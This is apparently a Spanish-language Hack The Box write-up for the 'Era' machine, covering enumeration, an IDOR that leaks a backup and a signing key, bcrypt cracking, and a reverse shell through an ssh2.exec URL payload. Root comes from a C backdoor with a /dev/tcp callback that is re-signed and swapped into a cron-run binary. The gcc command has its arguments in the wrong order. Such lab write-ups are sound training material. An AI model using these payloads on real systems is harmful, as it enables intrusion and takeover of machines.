# HTB: Era 

## Host: Linux
## IP: 10.10.11.79

## Procedimiento y comandos
#### Paso 1: Enumeracion

* Nmap

```bash

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Uptime guess: 5.266 days (since Sat Sep 13 05:41:23 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 59633/tcp)
HOP RTT       ADDRESS
1   335.24 ms 10.10.14.1
2   368.77 ms 10.10.11.79

```

* Directorios:

> No encntramos nada interesante

* Subdominios:

**FFuF**

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.era.htb" -u http://era.htb -mc 200 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 231ms]
:: Progress: [4989/4989] :: Job [1/1] :: 162 req/sec :: Duration: [0:00:27] :: Errors: 0 ::

```

Agregamos el subdominio a los hosts y repetimos el proceso de enumerar directorios:

* Dirsearch

```bash
dirsearch -u http://file.era.htb

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/Era/reports/http_file.era.htb/_25-09-18_13-18-34.txt

Target: http://file.era.htb/

[13:18:34] Starting: 
[13:18:42] 403 -  564B  - /.ht_wsr.txt                                      
[13:18:42] 403 -  564B  - /.htaccess.bak1                                   
[13:18:42] 403 -  564B  - /.htaccess.orig                                   
[13:18:42] 403 -  564B  - /.htaccess.sample
[13:18:42] 403 -  564B  - /.htaccess.save
[13:18:42] 403 -  564B  - /.htaccess_extra                                  
[13:18:42] 403 -  564B  - /.htaccess_orig
[13:18:42] 403 -  564B  - /.htaccess_sc
[13:18:42] 403 -  564B  - /.htaccessBAK
[13:18:42] 403 -  564B  - /.htaccessOLD
[13:18:42] 403 -  564B  - /.htaccessOLD2
[13:18:42] 403 -  564B  - /.htm                                             
[13:18:42] 403 -  564B  - /.html                                            
[13:18:42] 403 -  564B  - /.htpasswd_test                                   
[13:18:42] 403 -  564B  - /.htpasswds                                       
[13:18:42] 403 -  564B  - /.httr-oauth
[13:19:12] 301 -  178B  - /assets  ->  http://file.era.htb/assets/          
[13:19:12] 403 -  564B  - /assets/                                                                                                                                                                                                          
[13:19:28] 302 -    0B  - /download.php  ->  login.php                                                                                                                                                                                      
[13:19:33] 301 -  178B  - /files  ->  http://file.era.htb/files/                                                                                                                                                                            
[13:19:33] 403 -  564B  - /files/                                                                                                                                                                                                           
[13:19:33] 403 -  564B  - /files/cache/                                                                                                                                                                                                     
[13:19:33] 403 -  564B  - /files/tmp/                                                                                                                                                                                                       
[13:19:39] 301 -  178B  - /images  ->  http://file.era.htb/images/                                                                                                                                                                          
[13:19:39] 403 -  564B  - /images/                                                                                                                                                                                                          
[13:19:46] 200 -   34KB - /LICENSE                                                                                                                                                                                                          
[13:19:47] 200 -    9KB - /login.php                                                                                                                                                                                                        
[13:19:48] 200 -   70B  - /logout.php                                                                                                                                                                                                       
[13:19:50] 302 -    0B  - /manage.php  ->  login.php                                                                                                                                                                                        
[13:20:12] 200 -    3KB - /register.php                                                                                                                                                                                                     
[13:20:33] 302 -    0B  - /upload.php  ->  login.php                                                                                                                                                                                        
                                                                                                                                                                                                                                            
Task Completed
```
* FFuF

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u 'http://file.era.htb/FUZZ' -e .php,.html,.txt,.js,.json,.xml,.bak,.old -fs 6765 -fc 404 -t 50                   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Extensions       : .php .html .txt .js .json .xml .bak .old 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 :: Filter           : Response size: 6765
________________________________________________

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 821ms]
logout.php              [Status: 200, Size: 70, Words: 6, Lines: 1, Duration: 174ms]
register.php            [Status: 200, Size: 3205, Words: 1094, Lines: 106, Duration: 178ms]
login.php               [Status: 200, Size: 9214, Words: 3701, Lines: 327, Duration: 180ms]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 230ms]
files                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 168ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 171ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 234ms]
manage.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 166ms]
layout.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 171ms]
reset.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 166ms]
:: Progress: [239247/239247] :: Job [1/1] :: 297 req/sec :: Duration: [0:15:16] :: Errors: 9 ::
```

Luego de generar un registro y loguearnos exitosamente subimos un archivo y obtenemos la siguiente url de descarga del mismo:

```bash
http://file.era.htb/download.php?id=2966
```

El id es un parametro fuzzeable:

```bash
ffuf -w <(seq 0 10000) -u 'http://file.era.htb/download.php?id=FUZZ' -H "Cookie: PHPSESSID=4hp1nipcjl1kb3bibmoh4m5n7v" -mc 200 -fs 7686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Cookie: PHPSESSID=4hp1nipcjl1kb3bibmoh4m5n7v
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 7686
________________________________________________

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 808ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 192ms]
:: Progress: [10001/10001] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:52] :: Errors: 0 ::
```

Descargamos los archivos con los id 54 y 150

* archivos id = 150
```bash
cat x509.genkey 
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
prompt = no
string_mask = utf8only
x509_extensions = myexts

[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com

[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid

cat key.pem            
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCqKH30+RZjkxiV
JMnuB6b1dDbWUaw3p2QyQvWMbFvsi7zG1kE2LBrKjsEyvcxo8m0wL9feuFiOlciD
MamELMAW0UjMyew01+S+bAEcOawH81bVahxNkA4hHi9d/rysTe/dnNkh08KgHhzF
mTApjbV0MQwUDOLXSw9eHd+1VJClwhwAsL4xdk4pQS6dAuJEnx3IzNoQ23f+dPqT
CMAAWST67VPZjSjwW1/HHNi12ePewEJRGB+2K+YeGj+lxShW/I1jYEHnsOrliM2h
ZvOLqS9LjhqfI9+Q1RxIQF69yAEUeN4lYupa0Ghr2h96YLRE5YyXaBxdSA4gLGOV
HZgMl2i/AgMBAAECggEALCO53NjamnT3bQTwjtsUT9rYOMtR8dPt1W3yNX2McPWk
wC2nF+7j+kSC0G9UvaqZcWUPyfonGsG3FHVHBH75S1H54QnGSMTyVQU+WnyJaDyS
+2R9uA8U4zlpzye7+LR08xdzaed9Nrzo+Mcuq7DTb7Mjb3YSSAf0EhWMyQSJSz38
nKOcQBQhwdmiZMnVQp7X4XE73+2Wft9NSeedzCpYRZHrI820O+4MeQrumfVijbL2
xx3o0pnvEnXiqbxJjYQS8gjSUAFCc5A0fHMGmVpvL+u7Sv40mj/rnGvDEAnaNf+j
SlC9KdF5z9gWAPii7JQtTzWzxDinUxNUhlJ00df29QKBgQDsAkzNjHAHNKVexJ4q
4CREawOfdB/Pe0lm3dNf5UlEbgNWVKExgN/dEhTLVYgpVXJiZJhKPGMhSnhZ/0oW
gSAvYcpPsuvZ/WN7lseTsH6jbRyVgd8mCF4JiCw3gusoBfCtp9spy8Vjs0mcWHRW
PRY8QbMG/SUCnUS0KuT1ikiIYwKBgQC4kkKlyVy2+Z3/zMPTCla/IV6/EiLidSdn
RHfDx8l67Dc03thgAaKFUYMVpwia3/UXQS9TPj9Ay+DDkkXsnx8m1pMxV0wtkrec
pVrSB9QvmdLYuuonmG8nlgHs4bfl/JO/+Y7lz/Um1qM7aoZyPFEeZTeh6qM2s+7K
kBnSvng29QKBgQCszhpSPswgWonjU+/D0Q59EiY68JoCH3FlYnLMumPlOPA0nA7S
4lwH0J9tKpliOnBgXuurH4At9gsdSnGC/NUGHII3zPgoSwI2kfZby1VOcCwHxGoR
vPqt3AkUNEXerkrFvCwa9Fr5X2M8mP/FzUCkqi5dpakduu19RhMTPkdRpQKBgQCJ
tU6WpUtQlaNF1IASuHcKeZpYUu7GKYSxrsrwvuJbnVx/TPkBgJbCg5ObFxn7e7dA
l3j40cudy7+yCzOynPJAJv6BZNHIetwVuuWtKPwuW8WNwL+ttTTRw0FCfRKZPL78
D/WHD4aoaKI3VX5kQw5+8CP24brOuKckaSlrLINC9QKBgDs90fIyrlg6YGB4r6Ey
4vXtVImpvnjfcNvAmgDwuY/zzLZv8Y5DJWTe8uxpiPcopa1oC6V7BzvIls+CC7VC
hc7aWcAJeTlk3hBHj7tpcfwNwk1zgcr1vuytFw64x2nq5odIS+80ThZTcGedTuj1
qKTzxN/SefLdu9+8MXlVZBWj
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIUbWNKqYHhk6HkSMUgX/ebhOa29QswDQYJKoZIhvcNAQEL
BQAwTzERMA8GA1UECgwIRXJhIEluYy4xGTAXBgNVBAMMEEVMRiB2ZXJpZmljYXRp
b24xHzAdBgkqhkiG9w0BCQEWEHl1cml2aWNoQGVyYS5jb20wIBcNMjUwMTI2MDIw
OTM1WhgPMjEyNTAxMDIwMjA5MzVaME8xETAPBgNVBAoMCEVyYSBJbmMuMRkwFwYD
VQQDDBBFTEYgdmVyaWZpY2F0aW9uMR8wHQYJKoZIhvcNAQkBFhB5dXJpdmljaEBl
cmEuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqih99PkWY5MY
lSTJ7gem9XQ21lGsN6dkMkL1jGxb7Iu8xtZBNiwayo7BMr3MaPJtMC/X3rhYjpXI
gzGphCzAFtFIzMnsNNfkvmwBHDmsB/NW1WocTZAOIR4vXf68rE3v3ZzZIdPCoB4c
xZkwKY21dDEMFAzi10sPXh3ftVSQpcIcALC+MXZOKUEunQLiRJ8dyMzaENt3/nT6
kwjAAFkk+u1T2Y0o8FtfxxzYtdnj3sBCURgftivmHho/pcUoVvyNY2BB57Dq5YjN
oWbzi6kvS44anyPfkNUcSEBevcgBFHjeJWLqWtBoa9ofemC0ROWMl2gcXUgOICxj
lR2YDJdovwIDAQABozwwOjAMBgNVHRMBAf8EAjAAMAsGA1UdDwQEAwIHgDAdBgNV
HQ4EFgQU/XYF/LzWBMr+NhZw/PHUlQHb0s0wDQYJKoZIhvcNAQELBQADggEBAAzE
eNQxIJH6Z8vOvP8g1OoyD0Ot9E8U/PdxlM7QWqk9qcH0xyQZqg7Ee5L/kq4y/1i1
ZxAPlBfOUx4KhZgWVkStfvut0Ilg3VSXVntPPRi8WAcDV5nivYtphv16ZQkaclFy
dN0mYQc2NlqDv+y5FKnGbkioRUVGGmkIqeaT4HIUA2CFRnTr2Jao0TwAIG0jfpov
+y/t2WhUNto9L04vcD3ZAzuEPZnqs/L9rsoDZ1Ee3DxnOC7l3PkklaIiDrXiHAkd
Nrg7N9XCeQr0FUS0xLMBMVCEJT2TCo6lXKtcI5A5FgAcyECDzkw+HdgSYFPaoYJq
5rxH+xhuDqRDr941Sg4=
-----END CERTIFICATE-----
```

* Archivos id=54: backup.zip

```bash
tree .              
.
├── bg.jpg
├── css
│   ├── fontawesome-all.min.css
│   ├── images
│   │   └── overlay.png
│   ├── main.css
│   ├── main.css.save
│   └── noscript.css
├── download.php
├── filedb.sqlite
├── files
│   └── index.php
├── functions.global.php
├── index.php
├── initial_layout.php
├── layout_login.php
├── layout.php
├── LICENSE
├── login.php
├── logout.php
├── main.png
├── manage.php
├── register.php
├── reset.php
├── sass
│   ├── base
│   │   ├── _page.scss
│   │   ├── _reset.scss
│   │   └── _typography.scss
│   ├── components
│   │   ├── _actions.scss
│   │   ├── _button.scss
│   │   ├── _form.scss
│   │   ├── _icon.scss
│   │   ├── _icons.scss
│   │   └── _list.scss
│   ├── layout
│   │   ├── _footer.scss
│   │   ├── _main.scss
│   │   └── _wrapper.scss
│   ├── libs
│   │   ├── _breakpoints.scss
│   │   ├── _functions.scss
│   │   ├── _mixins.scss
│   │   ├── _vars.scss
│   │   └── _vendor.scss
│   ├── main.scss
│   └── noscript.scss
├── screen-download.png
├── screen-login.png
├── screen-main.png
├── screen-manage.png
├── screen-upload.png
├── security_login.php
├── site-backup-30-08-24.zip
├── upload.php
└── webfonts
    ├── fa-brands-400.eot
    ├── fa-brands-400.svg
    ├── fa-brands-400.ttf
    ├── fa-brands-400.woff
    ├── fa-brands-400.woff2
    ├── fa-regular-400.eot
    ├── fa-regular-400.svg
    ├── fa-regular-400.ttf
    ├── fa-regular-400.woff
    ├── fa-regular-400.woff2
    ├── fa-solid-900.eot
    ├── fa-solid-900.svg
    ├── fa-solid-900.ttf
    ├── fa-solid-900.woff
    └── fa-solid-900.woff2

10 directories, 63 files
```

* Revisamos el archivo de base de datos:

```bash
sqlite3 filedb.sqlite 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> SELECT * FROM users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
sqlite>
```
Guardamos los hashes en un archivo y los usuarios en otro e intentamos crackear los hashes:

```bash
hashcat -m 3200 hashes.txt  /usr/share/wordlists/rockyou.txt 

...

$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america
$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang

```

#### Paso 2: Acceso inicial

* FTP: Luego de intentar con eric sin exito, nos conectamos con yuri

```bash
ftp 10.10.11.79
Connected to 10.10.11.79.
220 (vsFTPd 3.0.5)
Name (10.10.11.79:kali): yuri
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||18477|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
ftp> 
```

* Descargamos todos los archivos para inspeccionar su contenido:

```bash
wget -r --ftp-user=yuri --ftp-password=mustang ftp://10.10.11.79/ -P ftp_loot/
```

* Tree:

```bash
tree .              
.
├── apache2_conf
│   ├── 000-default.conf
│   ├── apache2.conf
│   ├── file.conf
│   └── ports.conf
└── php8.1_conf
    ├── build
    │   ├── ax_check_compile_flag.m4
    │   ├── ax_gcc_func_attribute.m4
    │   ├── gen_stub.php
    │   ├── Makefile.global
    │   ├── php_cxx_compile_stdcxx.m4
    │   ├── phpize.m4
    │   ├── php.m4
    │   └── run-tests.php
    ├── calendar.so
    ├── ctype.so
    ├── dom.so
    ├── exif.so
    ├── ffi.so
    ├── fileinfo.so
    ├── ftp.so
    ├── gettext.so
    ├── iconv.so
    ├── opcache.so
    ├── pdo.so
    ├── pdo_sqlite.so
    ├── phar.so
    ├── posix.so
    ├── readline.so
    ├── shmop.so
    ├── simplexml.so
    ├── sockets.so
    ├── sqlite3.so
    ├── ssh2.so
    ├── sysvmsg.so
    ├── sysvsem.so
    ├── sysvshm.so
    ├── tokenizer.so
    ├── xmlreader.so
    ├── xml.so
    ├── xmlwriter.so
    ├── xsl.so
    └── zip.so
```



* Payload
```bash
http://file.era.htb/download.php?id=5624&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.218%2F4444%200%3E%261;true%27
```

* Receeptor

```bash
  nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.79] 40166
bash: cannot set terminal process group (17574): Inappropriate ioctl for device
bash: no job control in this shell
eric@era:~$ ls -la
ls -la
total 28
drwxr-x--- 5 eric eric 4096 Jul 22 08:42 .
drwxr-xr-x 4 root root 4096 Jul 22 08:42 ..
lrwxrwxrwx 1 root root    9 Jul  2 09:15 .bash_history -> /dev/null
-rw-r--r-- 1 eric eric 3771 Jan  6  2022 .bashrc
drwx------ 2 eric eric 4096 Sep 17  2024 .cache
drwxrwxr-x 3 eric eric 4096 Jul 22 08:42 .local
drwx------ 2 eric eric 4096 Sep 17  2024 .ssh
-rw-r----- 1 root eric   33 Sep 18 10:03 user.txt
eric@era:~$ cat user.txt
cat user.txt
9daa048fa60d5e0c9599807fb2c16af2
```
#### Paso 3: Privilege escalation

* Id y grupo

```bash
eric@era:~$ groups
groups
eric devs
eric@era:~$ id
id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs) 
```

* Ejecucion de tareas programadas: Vemos con pspy lo siguiente

```bash
2025/09/18 21:32:05 CMD: UID=0     PID=18538  | /opt/AV/periodic-checks/monitor                                                                                                    
2025/09/18 21:32:05 CMD: UID=0     PID=18527  | /bin/bash /root/initiate_monitoring.sh                                                                                             
2025/09/18 21:32:05 CMD: UID=0     PID=18525  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1                                       
2025/09/18 21:32:05 CMD: UID=0     PID=18524  | /usr/sbin/CRON -f -P
```

* Permisos de escritura por grupo:
```bash
eric@era:~$ find / -type f -perm -g=w -group devs 2>/dev/null                                                                                          
find / -type f -perm -g=w -group devs 2>/dev/null                                                                                                      
/opt/AV/periodic-checks/monitor                                                                                                                        
/opt/AV/periodic-checks/status.log
```

* Debemos crear un backdoor, compilarlo y luego servirlo, alternativamente se puede crear y compilar desde la sesion nc de eric.

* Creamos el backdoor

```bash
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.218/5555 0>&1'");
    return 0;
}
```

* Compilamos

```bash
gcc -static -o backdoor.c evil_backdoor
```

* Una vez servido el archivo en la maquina victima, debemos firmarlo.

[fuente](

* Extraemos la firma

```bash
eric@era:/tmp$ objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor                                         
<ction .text_sig=sig /opt/AV/periodic-checks/monitor                                                                        
eric@era:/tmp$ ls -la sig                                                                                                   
ls -la sig                                                                                                                  
-rw-rw-r-- 1 eric eric 458 Sep 18 21:14 sig
```

* Firmamos nuestro exploit

```bash
eric@era:/tmp$ objcopy --add-section .text_sig=sig evil_monitor                                                             
objcopy --add-section .text_sig=sig evil_monitor
```

* Explotamos el bianrio original copiando el nuestro en su lugar:

```bash
eric@era:/tmp$ cp evil_monitor /opt/AV/periodic-checks/monitor                                                              
cp evil_monitor /opt/AV/periodic-checks/monitor 
```

Esperamos un momento con el receptor activo.. 

* Receptor:

```bash
nc -lvnp 5555  
listening on [any] 5555 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.79] 43876
bash: cannot set terminal process group (18525): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~# cat /root/root.txt
cat /root/root.txt
c592f2974756c3b650b46c68bc122512
root@era:~# 
```

http://file.era.htb/download.php?id=9525&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.218%2F4444%200%3E%261;true%27
